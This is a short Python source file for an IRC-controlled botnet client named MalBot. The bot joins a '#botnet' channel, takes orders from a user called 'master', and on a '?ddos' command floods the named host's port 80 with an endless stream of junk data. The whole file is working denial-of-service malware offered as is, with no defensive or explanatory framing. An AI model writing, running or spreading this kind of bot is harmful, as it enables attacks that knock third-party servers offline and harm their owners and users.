
import pydle
import socket, sys


class MalBot(pydle.Client):

    def on_connect(self):
        self.channel = "#botnet"
        self.join(self.channel)

    def on_join(self, channel, user):
        super().on_join(channel, user)
        self.message(channel, 'Joined botnet')

    def attack(self, target):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        print("Connection established")
        payload = str.encode("I'm DDOSing your ass" * 420)
        bytes_sent = 0
        while True:
            s.send(payload)
            print("Bytes sent: {}".format(bytes_sent), end='\r')
            bytes_sent += len(payload)

    def on_message(self, channel, source, message):
        if source != "master":
            print("Ignoring message from non bot-master")
            return

        if message.startswith("?ddos"):
            address = message.split()[1]
            print("Acknowledged request to DDOS {}".format(address))
            self.message(self.channel, "Acknowledged request to DDOS {}".format(address))
            self.attack(address)
        else:
            print("Received message from master: {}, relaying it back to botmaster".format(message))
            self.message(self.channel, message)


client = MalBot(sys.argv[2], realname=sys.argv[2])
client.connect(sys.argv[1], 6697, tls=False, tls_verify=False, password="botnet")
client.handle_forever()

